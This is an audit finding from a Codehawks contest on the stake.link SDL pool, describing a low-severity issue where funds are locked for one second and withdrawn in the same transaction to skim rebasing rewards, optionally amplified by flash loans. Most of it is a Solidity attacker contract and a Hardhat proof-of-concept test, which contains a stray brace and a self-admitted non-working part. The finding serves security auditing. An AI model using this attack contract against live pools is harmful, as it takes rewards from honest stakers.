---
# Core Classification
protocol: stake.link
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 29744
audit_firm: Codehawks
contest_link: https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674
source_link: none
github_link: https://github.com/Cyfrin/2023-12-stake-link

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - innertia
  - 0xdraiakoo
  - TorpedopistolIxc41
---

## Vulnerability Title

Can lock Fund for 1 sec and unlock in same transaction to gain profit

### Overview

See description below for full details.

### Original Finding Content

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L107C4-L122C1">https://github.com/Cyfrin/2023-12-stake-link/blob/549b2b8c4a5b841686fceb9c311dca9ac58225df/contracts/core/sdlPool/SDLPoolPrimary.sol#L107C4-L122C1</a>


## Summary

Can lock Fund for 1 sec and unlock in same transaction to gain profit even if it's small amount yet there's no flashloan protection so malicious user can flashloan big amount and sandwich the rebasing upkeep to take advantage of the pool with dividing leads to zero problem to gain profit from pool.This way totalstaked amount can be manupilated. Checkupkeep and performUkeep completely user accessible so totalstake amount can change for the favor of malicious user
<details>
  <summary style="font-weight: bold; cursor: pointer;">Click to see Attack contract</summary>
  
  <p style="margin-left: 20px;">

```

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import{IERC677Receiver} from "../core/interfaces/IERC677Receiver.sol";
import{IERC721Receiver} from "../core/interfaces/IERC721Receiver.sol";
import{IERC677} from "../core/interfaces/IERC677.sol";
import{SDLPoolPrimary} from "../core/sdlPool/SDLPoolPrimary.sol";

interface IRESDLTokenBridge{
    function transferRESDL(
        uint64 _destinationChainSelector,
        address _receiver,
        uint256 _tokenId,
        bool _payNative,
        uint256 _maxLINKFee
    ) external payable returns (bytes32 messageId);
}

contract Attacker is IERC677Receiver{
       struct Data {
        address operator;
        address from;
        uint256 tokenId;
        bytes data;
    }
    SDLPoolPrimary public sdlPool;
    IRESDLTokenBridge public tokenBridge;
    IERC677 public sdlToken;
    uint256 public latestLockId;
    uint256 public totalRewards;
    Data[] private data;
    bool public received;
    constructor(address _sdlPool,address _tokenBridge,address _sdlToken)payable{
     sdlPool=SDLPoolPrimary(_sdlPool);
     tokenBridge=IRESDLTokenBridge(_tokenBridge);
     sdlToken=IERC677(_sdlToken);
    }
    function getData() external view returns (Data[] memory) {
        return data;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        data.push(Data(_operator, _from, _tokenId, _data));
        received=true;
        return this.onERC721Received.selector;
    }
   

    //@audit in all 1 transaction  u can lock-initiateunlock-withdraw thanks to 
    //@audit rounddown to zero...
    function attackTransfernCall() public payable{
     sdlToken.transferAndCall(address(sdlPool),200 ether ,abi.encode(uint256(0), uint64(1)));
     sdlPool.initiateUnlock(getLockId());
     sdlPool.withdraw(getLockId(),200 ether);
    } 

     function attackCcipTransfer() public payable{
       tokenBridge.transferRESDL{value:15 ether}(77,address(this),getLockId(),true,15 ether);
    } 

    function onTokenTransfer(
        address,
        uint256 _value,
        bytes calldata
    ) external virtual {
        totalRewards += _value;
    }
function getLockId()public view returns(uint256){
uint256[] memory lockIDs= new uint256[](1);
lockIDs=sdlPool.getLockIdsByOwner(address(this));
    return lockIDs[0];
}
    receive() external payable{

    
      }
    }
}
``` 
</p>
  
 
</details>
test case for hardhat(same test suit provided by Protocol)
run with 

```
npx hardhat test --network hardhat --grep 'usage of Attack contract and receiving NFT'

```

```
 import { Signer } from 'ethers'
import { assert, expect } from 'chai'
import {
  toEther,
  deploy,
  getAccounts,
  setupToken,
  fromEther,
  deployUpgradeable,
} from '../../utils/helpers'
import {
  ERC677,
  LinearBoostController,
  RewardsPool,
  SDLPoolPrimary,
  StakingAllowance,
  Attacker
} from '../../../typechain-types'
import { ethers } from 'hardhat'
import { time } from '@nomicfoundation/hardhat-network-helpers'
//1 day in seconds...
const DAY = 86400

// parsing Lock struct in contracts...
const parseLocks = (locks: any) =>
  locks.map((l: any) => ({
    amount: fromEther(l.amount),
    //show 4 digits after decimal...
    boostAmount: Number(fromEther(l.boostAmount).toFixed(10)),
    startTime: l.startTime.toNumber(),
    duration: l.duration.toNumber(),
    expiry: l.expiry.toNumber(),
  }))

  const parseData=(data:any)=>({
    operator:data.operator,
    from:data.from,
    tokenId:data.tokenId,
    data: Buffer.from(data.data.slice(2), 'hex').toString('utf8')
  })

describe('SDLPoolPrimary', () => {
  let sdlToken: StakingAllowance
  let rewardToken: ERC677
  let rewardsPool: RewardsPool
  let boostController: LinearBoostController
  let sdlPool: SDLPoolPrimary
  let signers: Signer[]
  let accounts: string[]
  let attacker:Attacker
  before(async () => {
    ;({ signers, accounts } = await getAccounts())
  })

  beforeEach(async () => {
    sdlToken = (await deploy('StakingAllowance', ['stake.link', 'SDL'])) as StakingAllowance
    rewardToken = (await deploy('ERC677', ['Chainlink', 'LINK', 1000000000])) as ERC677

    await sdlToken.mint(accounts[0], toEther(1000000))
    await setupToken(sdlToken, accounts)

    boostController = (await deploy('LinearBoostController', [
      4 * 365 * DAY,
      4,
    ])) as LinearBoostController

    sdlPool = (await deployUpgradeable('SDLPoolPrimary', [
      'Reward Escrowed SDL',
      'reSDL',
      sdlToken.address,
      boostController.address,
    ])) as SDLPoolPrimary

    rewardsPool = (await deploy('RewardsPool', [
      sdlPool.address,
      rewardToken.address,
    ])) as RewardsPool

    await sdlPool.addToken(rewardToken.address, rewardsPool.address)
    await sdlPool.setCCIPController(accounts[0])
    //attack contract deployment -- setting bridge contract to same we wont need ccip here
    attacker=await deploy("Attacker",[sdlPool.address,sdlPool.address,sdlToken.address]) as Attacker
    await sdlToken.transfer(attacker.address,toEther(20000))
    const sender = signers[0] // or choose any unlocked account
    const valueToSend = ethers.utils.parseEther("100") // Amount of Ether to send
    const tx = await sender.sendTransaction({
      to: attacker.address,
      value: valueToSend,
    });
  
    await tx.wait();
    console.log("Funded contract!");
  })
  it('should be able to lock an existing stake', async () => {
    //with flashloan this may prove fatal...
    await sdlToken.transferAndCall(
      sdlPool.address,
      toEther(10000),
      ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])
    )
    await sdlPool.extendLockDuration(1, 365 * DAY)
    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp

    assert.equal(fromEther(await sdlPool.totalEffectiveBalance()), 200)
    assert.equal(fromEther(await sdlPool.totalStaked()), 200)
    assert.equal(fromEther(await sdlPool.effectiveBalanceOf(accounts[0])), 200)
    assert.equal(fromEther(await sdlPool.staked(accounts[0])), 200)
    assert.deepEqual(parseLocks(await sdlPool.getLocks([1])), [
      { amount: 100, boostAmount: 100, startTime: ts, duration: 365 * DAY, expiry: 0 },
    ])

    // Move one block forward
  //await ethers.provider.send('evm_mine', []);
  //console.log("Parsed lock :",parseLocks(await sdlPool.getLocks([1])))
  })
  //@audit NFT onERC721receiver doesnt work it seems..
  it('usage of Attack contract and receiving NFT', async () => {
  console.log("Block-number before tx:",await ethers.provider.getBlockNumber())
  let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp
          // Move one block forward
  await ethers.provider.send('evm_mine', [ts+1]);
  console.log("SDLToken  balance Before:",await sdlToken.balanceOf(attacker.address))
  await attacker.attackTransfernCall()
  console.log("Lock",parseLocks(await sdlPool.getLocks([1])))
  console.log("Block-number after tx:",await ethers.provider.getBlockNumber())
  console.log("Nft received ??:",await attacker.received());
//boostAmount: 0.0006341958 20_000 -> with flashloan
//boostAmount: 0.000006342  200  
  })
})

```

## Impact
Loss of pool reward gained by rebasing.
## Tools Used

Hardhat-manuel review

## Recommendations

Setting lower-limit of locking time to stop bypassing 1 transaction lock-unlock-withdraw .This way it might stop the flashloan attacks too.
Preferable  minimum 1 day.

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Codehawks |
| Protocol | stake.link |
| Report Date | N/A |
| Finders | innertia, 0xdraiakoo, TorpedopistolIxc41 |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/Cyfrin/2023-12-stake-link
- **Contest**: https://www.codehawks.com/contests/clqf7mgla0001yeyfah59c674

### Keywords for Search

`vulnerability`

